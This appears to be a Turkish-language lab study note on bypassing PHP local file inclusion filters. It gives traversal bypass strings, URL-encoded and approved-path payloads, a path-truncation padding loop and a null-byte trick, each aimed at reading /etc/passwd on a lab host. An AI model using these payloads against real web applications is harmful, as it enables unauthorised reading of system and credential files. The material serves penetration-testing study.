# Basic Bypasses

## Non-Recursive Path Traversal Filters

Geliştiriciler LFI saldırılarını engellemek için aşağıdaki gibi bir kod kullanabilir:

```php title="Source Code"
$language = str_replace('../', '', $_GET['language']);
```

Bu kod GET parametresinde bulunan ../ ifadesini temizlemektedir.

Bu engeli aşmak için aşağıdaki ifadeler kullanılabilir:

* [x] ....//
* [x] ..././
* [x] ....\/
* [x] ....////

Aşağıda verilen kod için bu yöntem işe yaramaz:

```php title="Source Code"
include($_GET['language'] . '.php');
```

## Encoding

Bazı web siteleri özel karakterlerin URL kısmında kullanılmasını engelleyebilir.

Bu engeli aşmak için URL kodlaması kullanılabilir:

```sh
my@attack:~$ firefox "http://94.237.60.154:50882/index.php?language=%2E%2E%2F%2E%2E%2F%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64"
```

## Approved Paths

Bazı web uygulamaları RegEx kullanarak dosyaların belirli bir dizin altında olup olmadığını doğrulayabilir.

RegEx kontrolünde hangi dizinin hesaba katıldığını öğrendikten sonra bu engeli aşmak için LFI dizisi ilgili dizin ile güncellenir:

```sh
my@attack:~$ firefox "http://94.237.60.154:50882/index.php?language=./languages/../../../../etc/passwd"
```

## Path Truncation

Eski PHP sürümlerinde bir dizinin uzunluğu 4096 karakteri geçerse fazla karakterler kesilir.

Buna ek olarak aşağıdaki durumlarda da kesme işlemi gerçekleşir:

| BEFORE TRUNCATION | AFTER TRUNCATION |
|---|---|
| /etc/hosts/. | /etc/hosts |
| ///etc/hosts | /etc/hosts |
| /etc/./hosts | /etc/hosts |

Oldukça uzun bir LFI dizisi oluşturmak için aşağıdaki komutu kullanabiliriz:

!!! warning

    LFI dizisi var olmayan bir dizin adı ile başlamalıdır.

```sh
my@attack:~$ echo -n 'NonExistingDirectory/../../../etc/passwd/' && for i in {1..2048}; do echo -n './'; done
```

## Null Bytes

```sh
my@attack:~$ firefox "http://94.237.60.154:50882/index.php?language=./languages/../../../../etc/passwd%00"
```
